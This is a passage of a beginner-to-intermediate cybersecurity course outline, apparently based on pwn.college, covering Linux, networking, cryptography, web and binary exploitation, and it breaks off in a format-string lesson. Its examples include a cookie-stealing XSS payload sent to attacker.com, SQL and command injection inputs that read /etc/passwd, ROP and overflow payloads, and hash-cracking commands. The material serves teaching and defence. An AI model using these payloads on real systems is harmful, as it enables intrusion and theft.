# 🔐 Cybersecurity - Complete Curriculum (25 Lessons)

**Duration**: ~26 hours | **Level**: Beginner → Intermediate
**Outcome**: Understand offensive and defensive security fundamentals
**Inspiration**: Based on [pwn.college](https://pwn.college) open curriculum

> **Note**: This curriculum teaches security concepts and techniques for educational purposes. All challenges must be completed in isolated environments. Never apply these techniques to systems without explicit authorization.

---

## Level 1: Absolute Beginner (8 lessons, 4 hours)

### 1. Introduction to Cybersecurity (25min)
**Goal**: Understand what cybersecurity is and why it matters

**Content**:
- What is cybersecurity? The practice of protecting systems, networks, and data
- CIA Triad: Confidentiality, Integrity, Availability
- Attack vs Defense mindset
- Legal and ethical considerations
- Career paths in cybersecurity

**TL;DR**: Cybersecurity protects systems from unauthorized access and damage.

**Examples**:
```
Confidentiality: Encryption protects data from being read
Integrity: Checksums verify data hasn't been modified
Availability: Backups ensure systems stay operational
```

**Practice Questions**:
1. Which part of CIA triad does a firewall primarily protect? (Hint: It controls access)
2. Is testing vulnerabilities on your own computer legal? (Hint: Yes, it's your property)
3. What's the difference between hacking and cracking? (Hint: Intent and authorization)

**Key Points**:
- Security is about managing risk, not eliminating it
- Attackers only need to find one vulnerability
- Defenders must protect all attack surfaces
- Ethical hacking requires authorization

**Common Misconceptions**:
- "Hackers are always criminals" - Many are security professionals
- "Security is just about technology" - Human factors are critical
- "Small systems don't need security" - All systems are potential targets
- "Antivirus software is enough" - It's just one layer of defense

**Challenge**: Write a security policy document (25min, 2 NIM, 20 XP)
- Define what data needs protection
- List 3 security threats to your data
- Describe 3 countermeasures
- Explain one ethical consideration

**Rubric**:
- Clear data classification (25%)
- Realistic threats identified (25%)
- Practical countermeasures (25%)
- Ethical reasoning (25%)

---

### 2. Linux Command Line Basics (30min)
**Goal**: Navigate and control a Linux system via terminal

**Content**:
- Why Linux? Most servers and security tools run on Linux
- File system structure: /, /home, /etc, /bin, /tmp
- Essential commands: ls, cd, pwd, cat, echo, mkdir, rm
- File permissions: read, write, execute
- Getting help: man pages and --help flags

**TL;DR**: The command line is your primary interface for security work.

**Examples**:
```bash
# Navigate the file system
cd /home/user
pwd
ls -la

# Read file contents
cat file.txt
less large_file.txt

# Create and remove files
touch newfile.txt
mkdir new_directory
rm file.txt
```

**Practice Questions**:
1. What does `ls -la` show that `ls` doesn't? (Hint: Hidden files and permissions)
2. How do you see documentation for a command? (Hint: man command)
3. What's the difference between absolute and relative paths? (Hint: / at the start)

**Key Points**:
- Everything in Linux is a file (including devices)
- Commands are case-sensitive
- Spaces matter in command syntax
- Man pages are your best friend

**Common Misconceptions**:
- "GUI is easier" - CLI is faster once you learn it
- "I'll memorize all commands" - Use man pages and practice
- "Linux is harder than Windows" - Just different
- "Root access is always needed" - Only for system changes

**Challenge**: Navigate and analyze a file system (30min, 2 NIM, 20 XP)
- Find a hidden file in a directory structure
- Read its contents and extract a flag
- Create a directory structure matching specifications
- Set specific file permissions

**Rubric**:
- Successfully navigated directory tree (25%)
- Found and read hidden file (25%)
- Created correct structure (25%)
- Applied correct permissions (25%)

---

### 3. File Permissions & Access Control (30min)
**Goal**: Understand and manipulate Linux file permissions

**Content**:
- Permission types: read (r), write (w), execute (x)
- Permission targets: user, group, others
- Numeric notation: 777, 644, 755
- Special permissions: setuid, setgid, sticky bit
- Changing permissions: chmod, chown

**TL;DR**: File permissions control who can read, write, or execute files.

**Examples**:
```bash
# View permissions
ls -l file.txt
# -rw-r--r-- 1 user group 1234 Dec 25 12:00 file.txt

# Change permissions
chmod 755 script.sh  # rwxr-xr-x
chmod u+x file.sh    # Add execute for user
chmod go-w file.txt  # Remove write for group and others

# Change ownership
chown user:group file.txt
```

**Practice Questions**:
1. What does `chmod 644 file.txt` do? (Hint: rw-r--r--)
2. Why would a script need execute permission? (Hint: To run it)
3. What's dangerous about 777 permissions? (Hint: Anyone can modify)

**Key Points**:
- Default permissions matter for security
- Execute permission on directories means "enter"
- setuid allows running with owner's privileges (dangerous!)
- Principle of least privilege: minimal permissions needed

**Common Misconceptions**:
- "777 makes things easier" - It also makes things vulnerable
- "Permissions only apply to multi-user systems" - They protect against malware too
- "Root can bypass permissions" - True, but good practice still matters
- "Hidden files are secure" - They're just not displayed by default

**Challenge**: Secure a file system (30min, 2 NIM, 20 XP)
- Identify files with insecure permissions
- Fix overly permissive files
- Create a directory structure with proper access control
- Find and exploit a setuid vulnerability (in safe environment)

**Rubric**:
- Identified all insecure files (25%)
- Applied appropriate permissions (25%)
- Correct directory permissions (25%)
- Successfully exploited setuid (25%)

---

### 4. Basic Networking Concepts (30min)
**Goal**: Understand how computers communicate over networks

**Content**:
- IP addresses: IPv4 vs IPv6, public vs private
- Ports: Services listening on specific numbers (80=HTTP, 443=HTTPS, 22=SSH)
- Protocols: TCP (reliable), UDP (fast), ICMP (diagnostics)
- DNS: Converting names to IP addresses
- Basic tools: ping, netstat, curl, nc

**TL;DR**: Networks enable communication but also create attack surfaces.

**Examples**:
```bash
# Test connectivity
ping 8.8.8.8
ping google.com

# Check open ports
netstat -tulpn

# Make HTTP request
curl https://example.com

# Connect to a port
nc example.com 80
```

**Practice Questions**:
1. What's the difference between 127.0.0.1 and 192.168.1.1? (Hint: Loopback vs local)
2. Why use port 443 instead of 80? (Hint: Encryption)
3. What does a firewall do? (Hint: Filters traffic)

**Key Points**:
- Every network service is a potential vulnerability
- Localhost (127.0.0.1) is your own machine
- Private IPs (192.168.x.x, 10.x.x.x) aren't routable on internet
- Port scanning reveals running services

**Common Misconceptions**:
- "Closing a port makes a service secure" - The service needs to be secure too
- "HTTPS means the site is safe" - Only that the connection is encrypted
- "VPNs make you anonymous" - They hide your traffic from your ISP, not everything
- "Private IPs are secret" - They're just not directly accessible

**Challenge**: Network reconnaissance (30min, 3 NIM, 25 XP)
- Identify live hosts on a network
- Scan for open ports on a target
- Make HTTP requests to extract information
- Analyze network traffic capture

**Rubric**:
- Identified all live hosts (25%)
- Complete port scan results (25%)
- Extracted hidden information (25%)
- Analyzed traffic correctly (25%)

---

### 5. Introduction to Encoding (25min)
**Goal**: Understand how data is represented and transformed

**Content**:
- ASCII: Text representation (A=65, a=97)
- Hexadecimal: Base-16 representation (0-F)
- Base64: Encoding binary data as text
- URL encoding: Safe characters for web
- Why encoding isn't encryption

**TL;DR**: Encoding transforms data format; encryption protects data securely.

**Examples**:
```bash
# Base64 encoding
echo "Hello World" | base64
# SGVsbG8gV29ybGQK

echo "SGVsbG8gV29ybGQK" | base64 -d
# Hello World

# Hexadecimal
echo "Hello" | xxd
# 48 65 6c 6c 6f

# URL encoding
# Space becomes %20, ! becomes %21
```

**Practice Questions**:
1. Is Base64 encryption? (Hint: No, it's reversible without a key)
2. Why does "Hello" become "48656c6c6f" in hex? (Hint: ASCII values)
3. When do you need URL encoding? (Hint: Special characters in URLs)

**Key Points**:
- Encoding is reversible without a secret key
- Different encodings for different purposes
- Recognizing encoded data is a key skill
- Tools can auto-detect common encodings

**Common Misconceptions**:
- "Base64 is encryption" - It's just encoding, easily reversed
- "Encoding hides data" - It transforms it, doesn't protect it
- "All encoded data is suspicious" - Many legitimate uses
- "One encoding method is best" - Each has specific use cases

**Challenge**: Decode multi-layer encoding (25min, 2 NIM, 20 XP)
- Identify encoding types used
- Decode Base64 -> Hex -> ASCII
- Extract flag from encoded data
- Encode a message using multiple layers

**Rubric**:
- Correctly identified encodings (25%)
- Successfully decoded all layers (25%)
- Extracted flag (25%)
- Encoded message correctly (25%)

---

### 6. Basic Scripting for Security (35min)
**Goal**: Automate security tasks with bash scripts

**Content**:
- Shell scripts basics: shebang, variables, loops
- Working with files: reading, writing, processing
- Command substitution: $(command)
- Pipes and redirection: |, >, >>
- Practical scripts: log analysis, file searches

**TL;DR**: Automation multiplies your effectiveness in security work.

**Examples**:
```bash
#!/bin/bash
# Find large files
find / -size +100M 2>/dev/null

# Process log files
grep "ERROR" /var/log/app.log | wc -l

# Loop through files
for file in *.txt; do
    echo "Processing $file"
    cat "$file" | grep "password"
done

# Network sweep
for i in {1..254}; do
    ping -c 1 192.168.1.$i > /dev/null && echo "192.168.1.$i is up"
done
```

**Practice Questions**:
1. What does 2>/dev/null do? (Hint: Redirects errors)
2. How do you save command output to a file? (Hint: > or >>)
3. Why use loops in security work? (Hint: Testing multiple targets)

**Key Points**:
- Scripts make repetitive tasks efficient
- Always test scripts in safe environments first
- Error handling prevents incomplete results
- Comments make scripts maintainable

**Common Misconceptions**:
- "Scripts need to be complex" - Simple scripts are often best
- "Bash is the only option" - Python, Ruby also used
- "All tasks should be automated" - Some need human judgment
- "Scripts run instantly" - Large tasks take time

**Challenge**: Write security automation scripts (35min, 3 NIM, 25 XP)
- Script to find files with weak permissions
- Automated port scanner (basic)
- Log parser to find suspicious activity
- Batch file renaming with validation

**Rubric**:
- Permission scanner works correctly (25%)
- Port scanner identifies open ports (25%)
- Log parser finds anomalies (25%)
- File renaming handles edge cases (25%)

---

### 7. Introduction to Cryptography (35min)
**Goal**: Understand basic cryptographic concepts and techniques

**Content**:
- Encryption vs Encoding vs Hashing
- Symmetric encryption: Same key for encrypt/decrypt (AES)
- Asymmetric encryption: Public/private key pairs (RSA)
- Hashing: One-way functions (MD5, SHA256)
- Caesar cipher and XOR as learning tools

**TL;DR**: Cryptography protects data through mathematical transformations requiring keys.

**Examples**:
```python
# Caesar cipher (ROT13)
def caesar(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# XOR operation
def xor_encrypt(text, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * len(text)))

# Using openssl for real crypto
# Encrypt file
# openssl enc -aes-256-cbc -in file.txt -out file.enc

# Generate hash
# echo "password" | sha256sum
```

**Practice Questions**:
1. Can you decrypt a hash? (Hint: No, hashing is one-way)
2. Why use asymmetric encryption if it's slower? (Hint: Key distribution)
3. Is ROT13 secure? (Hint: No, it's deterministic and weak)

**Key Points**:
- Encryption protects confidentiality
- Hashing verifies integrity
- Never invent your own crypto algorithms
- Key management is often the weakness

**Common Misconceptions**:
- "Encryption makes data unbreakable" - Weak keys or algorithms fail
- "Hashing is encryption" - Hashing is one-way only
- "MD5 is fine for passwords" - It's broken, use bcrypt/scrypt
- "Longer passwords are exponentially harder" - True for brute force

**Challenge**: Cryptographic analysis (35min, 3 NIM, 25 XP)
- Break a Caesar cipher by frequency analysis
- Decrypt XOR with known plaintext
- Crack weak password hashes
- Implement a simple encryption tool

**Rubric**:
- Caesar cipher broken correctly (25%)
- XOR decryption successful (25%)
- Password hashes cracked (25%)
- Encryption tool works properly (25%)

---

### 8. Web Application Basics (30min)
**Goal**: Understand how web applications work and common vulnerabilities

**Content**:
- HTTP protocol: GET, POST, headers, cookies
- Client vs Server: What runs where
- HTML forms and user input
- Common vulnerabilities: XSS, SQL injection (intro)
- Developer tools in browsers

**TL;DR**: Web apps are complex systems with many potential security flaws.

**Examples**:
```bash
# HTTP request anatomy
GET /page HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123

# Testing with curl
curl -X POST https://example.com/login \
  -d "username=admin&password=test" \
  -v

# Looking at headers
curl -I https://example.com

# Simple XSS example (for learning)
# Input: <script>alert('XSS')</script>
# If not sanitized, this runs in browser
```

**Practice Questions**:
1. What's the difference between GET and POST? (Hint: Data visibility)
2. Where are cookies stored? (Hint: Browser)
3. Why is user input dangerous? (Hint: Can contain code)

**Key Points**:
- Never trust user input
- HTTP is stateless; cookies maintain sessions
- Client-side validation isn't security
- HTTPS encrypts traffic but doesn't prevent app bugs

**Common Misconceptions**:
- "HTTPS websites are automatically secure" - Only transport is encrypted
- "JavaScript validation protects forms" - Client-side is bypassable
- "Cookies are just for ads" - They maintain authentication too
- "View source shows everything" - JavaScript can load content dynamically

**Challenge**: Web application reconnaissance (30min, 3 NIM, 25 XP)
- Analyze HTTP requests/responses
- Modify requests to bypass client-side validation
- Extract information from cookies and headers
- Identify potential XSS injection points

**Rubric**:
- Request/response analysis complete (25%)
- Client-side validation bypassed (25%)
- Information extraction successful (25%)
- XSS points identified correctly (25%)

---

## Level 2: Security Fundamentals (9 lessons, 4.5 hours)

### 9. Assembly Language Basics (40min)
**Goal**: Read and understand x86-64 assembly code

**Content**:
- Why learn assembly? Reverse engineering requires it
- Registers: rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip
- Basic instructions: mov, add, sub, cmp, jmp, call, ret
- Stack: push, pop, function calls
- Memory addressing modes

**TL;DR**: Assembly is the human-readable form of machine code.

**Examples**:
```nasm
; Simple function
mov rax, 5      ; Put 5 in rax register
mov rbx, 10     ; Put 10 in rbx register
add rax, rbx    ; rax = rax + rbx (15)
ret             ; Return

; Function call
push rbp        ; Save old base pointer
mov rbp, rsp    ; Set new base pointer
sub rsp, 16     ; Allocate 16 bytes on stack
; ... function body ...
leave           ; Restore stack
ret             ; Return to caller

; Conditional jump
cmp rax, 0      ; Compare rax to 0
je equal_zero   ; Jump if equal
; ... not equal code ...
equal_zero:
; ... equal code ...
```

**Practice Questions**:
1. What does `rip` register contain? (Hint: Instruction pointer)
2. Why does the stack grow downward? (Hint: Convention)
3. What's the difference between `call` and `jmp`? (Hint: Return address)

**Key Points**:
- Registers are fast, limited CPU storage
- Stack stores local variables and return addresses
- Understanding assembly helps read disassembled code
- Different calling conventions exist (x86-64 Linux vs Windows)

**Common Misconceptions**:
- "Assembly is different for each program" - Same instructions, different logic
- "You need to write assembly" - Reading it is more important
- "Assembly is impossibly complex" - Small instruction set, repetitive patterns
- "High-level concepts disappear" - Loops, functions still visible

**Challenge**: Read and analyze assembly (40min, 3 NIM, 30 XP)
- Identify what a function does from assembly
- Find the return value of a computation
- Trace stack operations through a function
- Identify a buffer size from assembly code

**Rubric**:
- Function purpose identified (25%)
- Return value calculated correctly (25%)
- Stack operations traced (25%)
- Buffer size determined (25%)

---

### 10. Introduction to GDB Debugger (35min)
**Goal**: Use GDB to analyze running programs

**Content**:
- What is a debugger? Step-by-step program execution
- Starting GDB: gdb ./program
- Essential commands: run, break, continue, step, next, print
- Examining memory: x/10x $rsp, x/s 0x address
- Registers: info registers

**TL;DR**: Debuggers let you inspect program state at any point during execution.

**Examples**:
```bash
# Start debugging
gdb ./vulnerable_program

# Set breakpoint
(gdb) break main
(gdb) break *0x401234

# Run program
(gdb) run

# Examine state
(gdb) info registers
(gdb) x/20x $rsp          # View 20 hex values at stack pointer
(gdb) x/s $rdi            # View string at rdi
(gdb) print variable_name

# Step through code
(gdb) stepi               # Step one instruction
(gdb) nexti               # Next instruction (don't enter calls)
(gdb) continue            # Continue to next breakpoint

# Disassemble
(gdb) disassemble main
```

**Practice Questions**:
1. What's the difference between `step` and `next`? (Hint: Function calls)
2. How do you see what's at an address? (Hint: x/command)
3. Why set breakpoints? (Hint: Stop at interesting locations)

**Key Points**:
- Breakpoints pause execution at specific locations
- You can modify program state while debugging
- Examining memory reveals hidden data
- GDB shows you what's really happening

**Common Misconceptions**:
- "Debugging is only for fixing bugs" - Also for understanding programs
- "GDB is too hard" - Basic commands are simple
- "Debuggers change how programs work" - Minimal impact
- "You need source code" - Works with binaries too

**Challenge**: Debug and analyze a program (35min, 3 NIM, 30 XP)
- Set breakpoints at strategic locations
- Find a password stored in memory
- Modify a register to bypass a check
- Extract a flag by analyzing program flow

**Rubric**:
- Breakpoints set correctly (25%)
- Password found in memory (25%)
- Check bypassed successfully (25%)
- Flag extracted (25%)

---

### 11. Basic Reverse Engineering (40min)
**Goal**: Analyze compiled programs to understand their behavior

**Content**:
- Static vs dynamic analysis
- Tools: objdump, strings, file, ltrace, strace
- Identifying program structure: functions, loops, conditions
- Finding interesting data: strings, constants
- Decompilation vs disassembly

**TL;DR**: Reverse engineering reconstructs program logic from compiled code.

**Examples**:
```bash
# Basic information
file ./program
# ELF 64-bit LSB executable, x86-64

# Extract strings
strings ./program | grep -i password

# Disassemble
objdump -d ./program | less

# System calls
strace ./program

# Library calls
ltrace ./program

# More advanced: use Ghidra or IDA
# These provide decompilation to C-like pseudocode
```

**Practice Questions**:
1. What does `strings` show you? (Hint: Printable characters)
2. Why use `ltrace`? (Hint: Library function calls)
3. Is decompiled code identical to original? (Hint: No, variable names lost)

**Key Points**:
- Start with simple tools before complex ones
- Look for strings, error messages, debug output
- Function names often reveal purpose
- Practice with crackmes (reversing challenges)

**Common Misconceptions**:
- "Need to understand every instruction" - Focus on key logic
- "Reversing is illegal" - Depends on jurisdiction and purpose
- "Obfuscation makes reversing impossible" - Just harder
- "Decompiled code compiles back" - Usually needs manual fixes

**Challenge**: Reverse engineer a crackme (40min, 4 NIM, 35 XP)
- Identify what the program checks for
- Find the correct password/key
- Understand the validation algorithm
- Document the program's logic

**Rubric**:
- Program checks identified (25%)
- Correct password found (25%)
- Algorithm understood (25%)
- Clear documentation (25%)

---

### 12. Buffer Overflow Fundamentals (40min)
**Goal**: Understand how buffer overflows work and why they're dangerous

**Content**:
- What is a buffer? Fixed-size memory region
- Stack layout: local variables, saved rbp, return address
- Overflow: Writing past buffer boundaries
- Consequences: Corruption, crashes, control flow hijacking
- Protection mechanisms: Stack canaries, ASLR, NX

**TL;DR**: Writing past buffer boundaries can overwrite critical data including return addresses.

**Examples**:
```c
// Vulnerable function
void vulnerable() {
    char buffer[64];
    gets(buffer);  // No bounds checking! DANGEROUS
    // If input > 64 bytes, overwrites stack
}

// Stack layout before overflow:
// [buffer][saved rbp][return address]

// After overflow with 100 'A's:
// [AAAA...AAAA][AAAA][AAAA]
// Everything is overwritten!
```

```python
# Exploit concept (educational)
payload = b'A' * 72  # Fill buffer and saved rbp
payload += p64(0x401234)  # Overwrite return address
# When function returns, jumps to 0x401234
```

**Practice Questions**:
1. What happens when you overwrite the return address? (Hint: Jump to new location)
2. Why is `gets()` dangerous? (Hint: No size limit)
3. What does ASLR do? (Hint: Randomizes addresses)

**Key Points**:
- Classic vulnerability from C/C++ lack of bounds checking
- Modern systems have protections but still vulnerable
- Understanding this is foundation for exploitation
- Always use safe functions (fgets, strncpy)

**Common Misconceptions**:
- "Modern systems aren't vulnerable" - Protections can be bypassed
- "Only old code has this bug" - Still found in new software
- "Overflow must crash" - Careful overflow can hijack control
- "This only affects C programs" - C/C++ most common, but others too

**Challenge**: Analyze buffer overflow (40min, 4 NIM, 35 XP)
- Calculate exact offset to return address
- Determine buffer size from assembly
- Craft payload to control return address
- Bypass a simple stack canary

**Rubric**:
- Correct offset calculated (25%)
- Buffer size identified (25%)
- Payload crafted successfully (25%)
- Canary bypassed (25%)

---

### 13. Introduction to XSS (Cross-Site Scripting) (35min)
**Goal**: Understand and identify XSS vulnerabilities in web applications

**Content**:
- What is XSS? Injecting JavaScript into web pages
- Types: Reflected, Stored, DOM-based
- Why it's dangerous: Cookie theft, session hijacking, defacement
- Finding XSS: Testing input fields, URL parameters
- Prevention: Input sanitization, output encoding, CSP

**TL;DR**: XSS allows attackers to inject malicious scripts into web pages viewed by others.

**Examples**:
```html
<!-- Vulnerable code -->
<p>Hello, <?php echo $_GET['name']; ?>!</p>

<!-- Attack -->
http://site.com/?name=<script>alert('XSS')</script>

<!-- Result: -->
<p>Hello, <script>alert('XSS')</script>!</p>

<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/?c='+document.cookie
</script>

<!-- Stored XSS in comment -->
Comment: <script>alert('Stored XSS')</script>
<!-- Runs every time someone views the comment -->
```

**Practice Questions**:
1. What's the difference between reflected and stored XSS? (Hint: Persistence)
2. Can XSS work without <script> tags? (Hint: Yes, event handlers)
3. How does CSP help prevent XSS? (Hint: Restricts script sources)

**Key Points**:
- Test all user input fields and URL parameters
- XSS can bypass many security controls
- Stored XSS is more dangerous (affects multiple users)
- Always encode output based on context (HTML, JS, URL)

**Common Misconceptions**:
- "Input validation prevents XSS" - Output encoding is critical too
- "XSS only affects the user" - Can steal data, spread malware
- "WAFs block all XSS" - Many bypass techniques exist
- "HTTPS prevents XSS" - XSS happens after decryption

**Challenge**: Find and exploit XSS vulnerabilities (35min, 4 NIM, 35 XP)
- Identify XSS-vulnerable input fields
- Craft payload to bypass simple filters
- Demonstrate cookie theft (in safe environment)
- Write code to sanitize input properly

**Rubric**:
- Vulnerabilities identified (25%)
- Filter bypass successful (25%)
- Cookie theft demonstrated (25%)
- Sanitization code correct (25%)

---

### 14. SQL Injection Basics (40min)
**Goal**: Understand how SQL injection works and find vulnerable queries

**Content**:
- What is SQL injection? Manipulating database queries
- SQL basics: SELECT, WHERE, OR, AND, comments (--, #)
- Finding SQLi: Testing input with quotes, logical operators
- Impact: Data theft, authentication bypass, data modification
- Prevention: Prepared statements, parameterized queries

**TL;DR**: SQL injection exploits poor input handling to manipulate database queries.

**Examples**:
```sql
-- Vulnerable query
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- Normal input
username: admin
password: secret
-- Result: SELECT * FROM users WHERE username='admin' AND password='secret'

-- Injection
username: admin'--
password: (anything)
-- Result: SELECT * FROM users WHERE username='admin'--' AND password='...'
-- The -- comments out the password check!

-- Another injection
username: ' OR 1=1--
-- Result: SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
-- Returns all users because 1=1 is always true
```

**Practice Questions**:
1. What does `OR 1=1` do in a query? (Hint: Always true)
2. Why do quotes matter? (Hint: String delimiters)
3. How do prepared statements prevent SQLi? (Hint: Separate data from query)

**Key Points**:
- SQLi is among most critical web vulnerabilities
- Can lead to complete database compromise
- Testing is simple: add a quote and see errors
- Never build SQL queries with string concatenation

**Common Misconceptions**:
- "Escaping quotes is enough" - Better to use prepared statements
- "SQLi is easy to spot" - Error messages can be suppressed
- "NoSQL databases aren't vulnerable" - They have similar issues
- "ORMs prevent SQLi" - Only if used correctly

**Challenge**: SQL injection exploitation (40min, 4 NIM, 35 XP)
- Identify SQL injection vulnerability
- Bypass login authentication
- Extract data from database
- Use UNION to retrieve data from other tables

**Rubric**:
- Vulnerability identified (25%)
- Authentication bypassed (25%)
- Data extracted successfully (25%)
- UNION injection works (25%)

---

### 15. Command Injection (30min)
**Goal**: Understand OS command injection vulnerabilities

**Content**:
- What is command injection? Executing system commands via application
- How it happens: Unsafe use of system(), exec(), eval()
- Command separators: ;, &&, ||, |
- Information gathering: whoami, id, ls, cat
- Prevention: Avoid system commands, use libraries, sanitize input

**TL;DR**: Command injection allows attackers to execute arbitrary system commands.

**Examples**:
```php
// Vulnerable code
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>

// Normal: ?ip=8.8.8.8
// Output: Ping results

// Attack: ?ip=8.8.8.8; cat /etc/passwd
// Executes: ping -c 4 8.8.8.8; cat /etc/passwd
// Shows password file!

// Other separators
?ip=8.8.8.8 && whoami
?ip=8.8.8.8 | ls -la
?ip=`whoami`
?ip=$(cat /etc/passwd)
```

**Practice Questions**:
1. What does `&&` do between commands? (Hint: Runs second if first succeeds)
2. Can you inject without semicolons? (Hint: Yes, many separators)
3. What's the difference between `system()` and `exec()`? (Hint: Output handling)

**Key Points**:
- Never pass user input directly to system commands
- Many programming languages have vulnerable functions
- Command injection often leads to full system compromise
- Use safe alternatives (libraries, APIs) instead of shell commands

**Common Misconceptions**:
- "Whitelisting input is foolproof" - Still risky with system calls
- "Web apps don't run system commands" - Many do
- "Linux-only issue" - Affects Windows too (different syntax)
- "Only affects PHP" - All languages can be vulnerable

**Challenge**: Exploit command injection (30min, 3 NIM, 30 XP)
- Identify command injection point
- Extract sensitive files
- Establish reverse shell (in safe environment)
- Chain multiple commands for full access

**Rubric**:
- Injection point found (25%)
- Files extracted (25%)
- Reverse shell established (25%)
- Command chaining successful (25%)

---

### 16. Password Cracking Techniques (35min)
**Goal**: Understand how passwords are attacked and protected

**Content**:
- Hash functions: MD5, SHA1, SHA256, bcrypt
- Attack types: Brute force, dictionary, rainbow tables
- Password complexity: Length vs complexity
- Tools: hashcat, john the ripper
- Defense: Salting, slow hashing algorithms, length requirements

**TL;DR**: Weak passwords can be cracked; strong hashing and salting protect against this.

**Examples**:
```bash
# Hash a password (MD5 - weak!)
echo -n "password123" | md5sum
# 482c811da5d5b4bc6d497ffa98491e38

# Dictionary attack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat GPU cracking
hashcat -m 0 -a 0 hash.txt wordlist.txt
# -m 0 = MD5
# -a 0 = Dictionary attack

# Bcrypt hash (strong)
# $2b$12$randomsalt... - includes salt and cost factor
```

**Practice Questions**:
1. Why is bcrypt better than MD5? (Hint: Intentionally slow)
2. What's a rainbow table? (Hint: Precomputed hashes)
3. Does salting prevent cracking? (Hint: No, just makes it harder)

**Key Points**:
- Password strength = length + unpredictability
- Modern GPUs can try billions of hashes per second
- Salting prevents rainbow table attacks
- Slow hash functions (bcrypt, scrypt) resist brute force

**Common Misconceptions**:
- "Complex passwords are uncrackable" - Length matters more
- "Hashing = encryption" - Hashing is one-way
- "Adding salt makes passwords uncrackable" - Just harder
- "12-character passwords are always safe" - Depends on character set

**Challenge**: Password cracking exercise (35min, 3 NIM, 30 XP)
- Identify hash types
- Crack weak MD5 hashes
- Understand why bcrypt hashes resist cracking
- Calculate password strength metrics

**Rubric**:
- Hash types identified (25%)
- MD5 hashes cracked (25%)
- Bcrypt resistance explained (25%)
- Strength calculations correct (25%)

---

### 17. Network Traffic Analysis (35min)
**Goal**: Analyze network packets to understand communications and find security issues

**Content**:
- Packet capture: tcpdump, Wireshark
- Protocol layers: Ethernet, IP, TCP/UDP, Application
- Following streams: Reconstructing conversations
- Finding credentials: Unencrypted protocols (HTTP, FTP, Telnet)
- Analyzing attacks: Port scans, suspicious connections

**TL;DR**: Network traffic contains detailed information about all communications.

**Examples**:
```bash
# Capture packets with tcpdump
sudo tcpdump -i eth0 -w capture.pcap

# Read capture file
tcpdump -r capture.pcap

# Filter traffic
tcpdump -r capture.pcap 'tcp port 80'
tcpdump -r capture.pcap 'host 192.168.1.100'

# Look for passwords
tcpdump -r capture.pcap -A | grep -i password

# Wireshark filters
http.request.method == "POST"
tcp.port == 22
ip.addr == 10.0.0.1
```

**Practice Questions**:
1. What's the difference between promiscuous mode and normal? (Hint: Captures all traffic)
2. Can you see HTTPS content? (Hint: No, it's encrypted)
3. What does following a TCP stream show? (Hint: Complete conversation)

**Key Points**:
- Unencrypted protocols expose sensitive data
- Packet capture requires appropriate permissions
- Wireshark makes analysis much easier
- Encryption protects against traffic analysis

**Common Misconceptions**:
- "VPNs make traffic invisible" - VPN endpoint sees everything
- "Only hackers need packet analysis" - Essential for troubleshooting
- "Switched networks prevent sniffing" - ARP spoofing bypasses this
- "Capturing is illegal" - Depends on network and jurisdiction

**Challenge**: Analyze captured network traffic (35min, 4 NIM, 35 XP)
- Find credentials transmitted in clear text
- Identify port scan activity
- Reconstruct HTTP conversation
- Detect suspicious DNS queries

**Rubric**:
- Credentials extracted (25%)
- Port scan identified (25%)
- HTTP conversation reconstructed (25%)
- DNS analysis complete (25%)

---

## Level 3: Exploitation & Defense (8 lessons, 5 hours)

### 18. Return-Oriented Programming (ROP) (45min)
**Goal**: Understand advanced exploitation technique bypassing NX protection

**Content**:
- The problem: NX bit prevents executing stack data
- Solution: Use existing code (gadgets) in program
- Gadgets: Short instruction sequences ending in `ret`
- ROP chains: Linking gadgets to perform actions
- Tools: ROPgadget, ropper

**TL;DR**: ROP chains together existing code fragments to bypass security protections.

**Examples**:
```python
# Finding gadgets
# ropper --file ./binary --search "pop rdi; ret"

# Example ROP chain (conceptual)
payload = b'A' * 72  # Fill buffer

# Gadget 1: pop rdi; ret (address: 0x401234)
# Loads next value into rdi register
payload += p64(0x401234)
payload += p64(0x4040a0)  # Address of "/bin/sh" string

# Gadget 2: pop rsi; ret (address: 0x401236)
payload += p64(0x401236)
payload += p64(0x0)  # NULL

# Call system() function
payload += p64(0x401050)  # Address of system@plt

# Result: system("/bin/sh")
```

**Practice Questions**:
1. Why does NX prevent shellcode? (Hint: Marks stack non-executable)
2. What's a gadget? (Hint: Short code sequence ending in ret)
3. Why must gadgets end in `ret`? (Hint: Chains execution)

**Key Points**:
- ROP bypasses DEP/NX protection
- Requires understanding target binary thoroughly
- Modern exploitation relies heavily on ROP
- ASLR makes ROP harder (need information leak)

**Common Misconceptions**:
- "NX prevents all code execution exploits" - ROP bypasses it
- "ROP is too complex to use" - Tools automate much of it
- "Any instruction sequence works" - Need ret to chain
- "Modern systems prevent ROP" - Still possible, just harder

**Challenge**: Build a ROP chain (45min, 5 NIM, 40 XP)
- Identify useful gadgets in binary
- Calculate offsets for ROP chain
- Chain gadgets to call specific function
- Bypass NX to gain code execution

**Rubric**:
- Gadgets identified correctly (25%)
- Offsets calculated accurately (25%)
- Function call successful (25%)
- NX bypassed (25%)

---

### 19. Format String Vulnerabilities (40min)
**Goal**: Exploit format string bugs to read/write arbitrary memory

**Content**:
- What is a format string? printf("%s %d", str, num)
- The vulnerability: printf(user_input)
- Reading memory: %x, %s, %p format specifiers
- Writing memory: %n specifier (writes bytes printed)
- Direct parameter access: %7$x

**TL;DR**: Format string bugs allow reading and writing arbitrary memory locations.

**Examples**:
```c
// Vulnerable code
void vulnerable(char *input) {
    printf(input);  // WRONG! Should be printf("%s", input)
}

// Exploit examples
// Read stack
input: "AAAA %p %p %p %p"
// Prints: AAAA 0x7fff1234 0x41414141 0x70207025 ...

// Find offset
input: "AAAA %7$p"
// If output shows 0x41414141, offset is 7

// Write to address
input: "\x10\x40\x40\x00%100x%7$n"
// Writes value 104 to address 0x404010
```

**Practice Questions**:
1. What does %x do? (Hint: Prints hex value from stack)
2. How does %n write memory? (Hint: Stores bytes printed so far)
3. Why is direct parameter access useful? (Hint: Faster to reach target)

**Key Points**:
- Always use printf("%s", input) not printf(input)
